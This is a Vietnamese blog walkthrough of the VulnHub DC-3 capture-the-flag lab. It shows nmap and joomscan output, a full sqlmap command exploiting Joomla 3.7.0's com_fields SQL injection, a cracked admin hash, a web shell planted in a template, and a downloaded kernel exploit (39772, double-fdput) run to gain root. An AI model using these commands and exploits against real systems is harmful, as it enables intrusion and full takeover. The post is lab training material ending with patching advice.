<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="pentest,CyberSecurity"><meta name=description content="Mở đầu  Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên VulnHub. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D. Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú"><meta property="og:description" content="Mở đầu  Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên VulnHub. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D. Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-06-14T10:08:47+07:00"><meta property="article:modified_time" content="2019-06-14T10:08:47+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú"><meta name=twitter:description content="Mở đầu  Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên VulnHub. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D. Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú","item":"https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú","name":"VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú","description":"Mở đầu  Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên VulnHub. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D. Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm.","keywords":["pentest","CyberSecurity"],"articleBody":"Mở đầu  Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên VulnHub. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D. Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm. Mở Virtual Box chọn card mạng bridge để cho anh em vào được rồi run nó lên thôi. Link con lab ấy đây, bạn nào muốn nghịch thì vào đây nha DC-3  Tấn công   Trong mô tả của lab DC-3 cũng đã nói. Nó sẽ cho ta 1 con web và bắt chúng ta phải chiếm được quyền root và lấy cờ từ đó.\n  Đầu tiên phải quét được ip của con lab đang ở đâu đã. Sử dụng lệnh nmap -sP 192.168.19.0/24 (dải địa chỉ tùy theo mạng nội bộ của bạn)\n1 2 3  Nmap scan report for 192.168.19.106 Host is up (0.00050s latency). MAC Address: 08:00:27:1C:53:6A (Oracle VirtualBox virtual NIC)     Ở đây tôi đã xác định được địa chỉ ip của con máy kia rồi, vào thôi.   Giao diện con web cũng chẳng có gì, phát hiện được trang login, rồi trang quản trị /administrator nữa.\n  Sử dụng Wappalyzer quét xem con web này đang sử dụng framework gì nào. Joomla, thế thì sử dụng joomscan trên kali thôi chứ còn gì nữa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  [+] FireWall Detector [++] Firewall not detected [+] Detecting Joomla Version [++] Joomla 3.7.0 [+] Core Joomla Vulnerability [++] Target Joomla core is not vulnerable [+] Checking Directory Listing [++] directory has directory listing : http://192.168.19.106/administrator/components http://192.168.19.106/administrator/modules http://192.168.19.106/administrator/templates http://192.168.19.106/images/banners [+] Checking apache info/status files [++] Readable info/status files are not found [+] admin finder [++] Admin page : http://192.168.19.106/administrator/ [+] Checking robots.txt existing [++] robots.txt is not found [+] Finding common backup files name [++] Backup files are not found [+] Finding common log files name [++] error log is not found [+] Checking sensitive config.php.x file [++] Readable config files are not found Your Report : reports/192.168.19.106/     Trang này sử dụng Joomla 3.7.0. Thử lục các CVE xem có cái nào nói về Joomla 3.7.0 k.\n    Vãi nhái, hẳn SQL Injection luôn ạ, vào đọc thì thấy luôn Using Sqlmap luôn. Dump db ra thôi\n1  sqlmap -u \"http://192.168.19.106/index.php?option=com_fields\u0026view=fields\u0026layout=modal\u0026list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]     Lấy được tên db rồi lấy tên bảng, dump thẳng vào table #__users ta thấy được\n   id name email username password     629 admin freddy@norealaddress.net admin $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu      Chúng ta có admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu, sử dụng hashcat hoặc john để giải ra được mật khẩu là snoopy.\n  Sử dụng mật khẩu để đăng nhập vào trang admin thôi :D\n  Vào được trang rồi ta nghĩ đến gì, upload file shell =)). Đi tìm chỗ nào upload được file. Thôi lên google hỏi cho nhanh. Google bảo là vào template để upload file nhé :D.\n  Ở đây chúng ta sửa được nhiều thứ lắm, các bạn có thể vào chọc ngoáy nhé, mình upload shell lên error.php cho nhanh :D\n   Xịn xò rồi, bắt tay vào chiếm quyền root thôi À thực ra ban đầu mình cũng chẳng biết nên bắt đầu từ đâu, thôi cứ thử bừa. lên google đọc mấy cái CVE từ tìm chương trình nào đang chạy dưới quyền root có lỗ hổng rồi sử dụng lỗ hổng đó để chiếm root, … các thứ các thứ. Mình thử xem uname -a xem có gì k. Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux. Máy chủ sử dụng kernel 4.4.0. Search CVE tiếp xem có lỗi gì đến con Kernel này k. Sử dụng searchsploit kernel 4.4 ra kết quả Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PR | exploits/linux/local/39772.txt. Ta có thể sử dụng thằng này để chiếm quyền root. cd đến /var/tmp rồi wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip   Giải nén các thứ các thứ    run compile.sh lên rồi chạy file ./doubleput\n1 2 3 4 5 6 7 8 9  p0wny@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput starting writev woohoo, got pointer reuse writev returned successfully. if this worked, you'll have a root shell in =60 seconds. suid file detected, launching rootshell... we have root privs now... root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# whoami;id root uid=0(root) gid=0(root) groups=0(root),33(www-data)     Ngon, có quyền root rồi, vào thư mục /root lấy cờ thôi\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root root@shell:/root# ls the-flag.txt root@shell:/root# cat the-flag.txt __ __ _ _ ____ _ _ _ _ \\ \\ / /__| | | | _ \\ ___ _ __ ___| | | | | \\ \\ /\\ / / _ \\ | | | | | |/ _ \\| '_ \\ / _ \\ | | | | \\ V V / __/ | | | |_| | (_) | | | | __/_|_|_|_| \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_) Congratulations are in order. :-) I hope you've enjoyed this challenge as I enjoyed making it. If there are any ways that I can improve these little challenges, please let me know. As per usual, comments and complaints can be sent via Twitter to @DCAU7 Have a great day!!!! root@shell:/root#     Kết luận  Dựa trên bài lab thấy được thằng Joomla cần phải kiểm tra cập nhật thường xuyên. Những ai đang sử dụng Joomla 3.7.0 cần phải được cập nhật ngay. Kernel Linux cũng cần phải cập nhật lên bản cao hơn. Cần chú ý đến các phiên bản cập nhật để vá lỗi cần thiết.  ","wordCount":"970","inLanguage":"en","datePublished":"2019-06-14T10:08:47+07:00","dateModified":"2019-06-14T10:08:47+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú</h1><div class=post-meta><span title="2019-06-14 10:08:47 +0700 +0700">June 14, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#m%e1%bb%9f-%c4%91%e1%ba%a7u aria-label="Mở đầu">Mở đầu</a></li><li><a href=#t%e1%ba%a5n-c%c3%b4ng aria-label="Tấn công">Tấn công</a></li><li><a href=#k%e1%ba%bft-lu%e1%ba%adn aria-label="Kết luận">Kết luận</a></li></ul></div></details></div><div class=post-content><h2 id=mở-đầu>Mở đầu<a hidden class=anchor aria-hidden=true href=#mở-đầu>#</a></h2><ul><li>Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên <code>VulnHub</code>. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D.</li><li>Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm. Mở <code>Virtual Box</code> chọn card mạng bridge để cho anh em vào được rồi run nó lên thôi.</li><li>Link con lab ấy đây, bạn nào muốn nghịch thì vào đây nha <a href=https://www.vulnhub.com/entry/dc-3,312/>DC-3</a></li></ul><h2 id=tấn-công>Tấn công<a hidden class=anchor aria-hidden=true href=#tấn-công>#</a></h2><ul><li><p>Trong mô tả của lab <code>DC-3</code> cũng đã nói. Nó sẽ cho ta 1 con web và bắt chúng ta phải chiếm được quyền <code>root</code> và lấy cờ từ đó.</p></li><li><p>Đầu tiên phải quét được ip của con lab đang ở đâu đã. Sử dụng lệnh <code>nmap -sP 192.168.19.0/24</code> (dải địa chỉ tùy theo mạng nội bộ của bạn)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.19.106
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00050s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:1C:53:6A <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>Ở đây tôi đã xác định được địa chỉ ip của con máy kia rồi, vào thôi.
<img loading=lazy src=https://images.viblo.asia/5905140f-b553-465c-921f-6ab68f2abad2.png alt></p></li><li><p>Giao diện con web cũng chẳng có gì, phát hiện được trang login, rồi trang quản trị <code>/administrator</code> nữa.</p></li><li><p>Sử dụng <code>Wappalyzer</code> quét xem con web này đang sử dụng framework gì nào. <code>Joomla</code>, thế thì sử dụng <code>joomscan</code> trên kali thôi chứ còn gì nữa.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> FireWall Detector
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Firewall not detected
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Detecting Joomla Version
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Joomla 3.7.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Core Joomla Vulnerability
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Target Joomla core is not vulnerable
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking Directory Listing
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> directory has directory listing : 
</span></span><span class=line><span class=cl>http://192.168.19.106/administrator/components
</span></span><span class=line><span class=cl>http://192.168.19.106/administrator/modules
</span></span><span class=line><span class=cl>http://192.168.19.106/administrator/templates
</span></span><span class=line><span class=cl>http://192.168.19.106/images/banners
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking apache info/status files
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Readable info/status files are not found
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> admin finder
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Admin page : http://192.168.19.106/administrator/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking robots.txt existing
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> robots.txt is not found
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Finding common backup files name
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Backup files are not found
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Finding common log files name
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> error log is not found
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking sensitive config.php.x file
</span></span><span class=line><span class=cl><span class=o>[</span>++<span class=o>]</span> Readable config files are not found
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Your Report : reports/192.168.19.106/
</span></span></code></pre></td></tr></table></div></div></li><li><p>Trang này sử dụng <code>Joomla 3.7.0</code>. Thử lục các <code>CVE</code> xem có cái nào nói về Joomla 3.7.0 k.</p></li></ul><p><img loading=lazy src=https://images.viblo.asia/6121b679-d812-4b8d-aa3d-83d481561b2e.png alt></p><ul><li><p>Vãi nhái, hẳn SQL Injection luôn ạ, vào đọc thì thấy luôn <code>Using Sqlmap</code> luôn. Dump db ra thôi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;http://192.168.19.106/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span class=o>=</span><span class=m>3</span> --level<span class=o>=</span><span class=m>5</span> --random-agent --dbs -p list<span class=o>[</span>fullordering<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>Lấy được tên db rồi lấy tên bảng, dump thẳng vào table <code>#__users</code> ta thấy được</p><table><thead><tr><th>id</th><th style=text-align:center>name</th><th style=text-align:right>email</th><th style=text-align:right>username</th><th style=text-align:right>password</th></tr></thead><tbody><tr><td>629</td><td style=text-align:center>admin</td><td style=text-align:right><a href=mailto:freddy@norealaddress.net>freddy@norealaddress.net</a></td><td style=text-align:right>admin</td><td style=text-align:right>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</td></tr></tbody></table></li><li><p>Chúng ta có <code>admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code>, sử dụng <code>hashcat</code> hoặc <code>john</code> để giải ra được mật khẩu là <code>snoopy</code>.</p></li><li><p>Sử dụng mật khẩu để đăng nhập vào trang admin thôi :D</p></li><li><p>Vào được trang rồi ta nghĩ đến gì, upload file shell =)). Đi tìm chỗ nào upload được file. Thôi lên google hỏi cho nhanh. Google bảo là vào template để upload file nhé :D.</p></li><li><p>Ở đây chúng ta sửa được nhiều thứ lắm, các bạn có thể vào chọc ngoáy nhé, mình upload shell lên error.php cho nhanh :D</p></li></ul><p><img loading=lazy src=https://images.viblo.asia/0c4c495e-1272-469e-b85b-a8214dd46237.png alt></p><ul><li>Xịn xò rồi, bắt tay vào chiếm quyền root thôi</li><li>À thực ra ban đầu mình cũng chẳng biết nên bắt đầu từ đâu, thôi cứ thử bừa. lên google đọc mấy cái CVE từ tìm chương trình nào đang chạy dưới quyền root có lỗ hổng rồi sử dụng lỗ hổng đó để chiếm root, &mldr; các thứ các thứ. Mình thử xem <code>uname -a</code> xem có gì k. <code>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</code>. Máy chủ sử dụng kernel 4.4.0. Search CVE tiếp xem có lỗi gì đến con Kernel này k.</li><li>Sử dụng <code>searchsploit kernel 4.4</code> ra kết quả <code>Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PR | exploits/linux/local/39772.txt</code>. Ta có thể sử dụng thằng này để chiếm quyền root.</li><li>cd đến <code>/var/tmp</code> rồi <code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></li></ul><p><img loading=lazy src=https://images.viblo.asia/abfc7be6-9f01-481a-9abb-eedbfdd7f591.png alt></p><ul><li>Giải nén các thứ các thứ</li></ul><p><img loading=lazy src=https://images.viblo.asia/4b93fcd6-3059-4678-b628-a543626cd6e0.png alt></p><p><img loading=lazy src=https://images.viblo.asia/3c25116b-d5fd-45d7-8b69-c14457c3cedb.png alt></p><ul><li><p>run <code>compile.sh</code> lên rồi chạy file <code>./doubleput</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>p0wny@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
</span></span><span class=line><span class=cl>starting writev
</span></span><span class=line><span class=cl>woohoo, got pointer reuse
</span></span><span class=line><span class=cl>writev returned successfully. <span class=k>if</span> this worked, you<span class=err>&#39;</span>ll have a root shell in &lt;<span class=o>=</span><span class=m>60</span> seconds.
</span></span><span class=line><span class=cl>suid file detected, launching rootshell...
</span></span><span class=line><span class=cl>we have root privs now...
</span></span><span class=line><span class=cl>root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# whoami<span class=p>;</span>id
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,33<span class=o>(</span>www-data<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>Ngon, có quyền root rồi, vào thư mục <code>/root</code> lấy cờ thôi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=go> root@shell:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
</span></span></span><span class=line><span class=cl><span class=go> root@shell:/root# ls
</span></span></span><span class=line><span class=cl><span class=go> the-flag.txt
</span></span></span><span class=line><span class=cl><span class=go> root@shell:/root# cat the-flag.txt
</span></span></span><span class=line><span class=cl><span class=go> __        __   _ _   ____                   _ _ _ _
</span></span></span><span class=line><span class=cl><span class=go> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
</span></span></span><span class=line><span class=cl><span class=go> \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |
</span></span></span><span class=line><span class=cl><span class=go> \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
</span></span></span><span class=line><span class=cl><span class=go>     \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Congratulations are in order.  :-)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> I hope you&#39;ve enjoyed this challenge as I enjoyed making it.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> If there are any ways that I can improve these little challenges,
</span></span></span><span class=line><span class=cl><span class=go> please let me know.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> As per usual, comments and complaints can be sent via Twitter to @DCAU7
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Have a great day!!!!
</span></span></span><span class=line><span class=cl><span class=go> root@shell:/root#
</span></span></span></code></pre></td></tr></table></div></div></li></ul><h2 id=kết-luận>Kết luận<a hidden class=anchor aria-hidden=true href=#kết-luận>#</a></h2><ul><li>Dựa trên bài lab thấy được thằng Joomla cần phải kiểm tra cập nhật thường xuyên. Những ai đang sử dụng Joomla 3.7.0 cần phải được cập nhật ngay.</li><li>Kernel Linux cũng cần phải cập nhật lên bản cao hơn. Cần chú ý đến các phiên bản cập nhật để vá lỗi cần thiết.</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/pentest/>pentest</a></li><li><a href=https://minhtuanact.github.io/tags/cybersecurity/>CyberSecurity</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/vulnhub-ctf-dc-2-cuop-5-flags-va-cai-ket/><span class=title>« Prev</span><br><span>VulnHub CTF - DC-2 - Cướp 5 flags và cái kết</span></a>
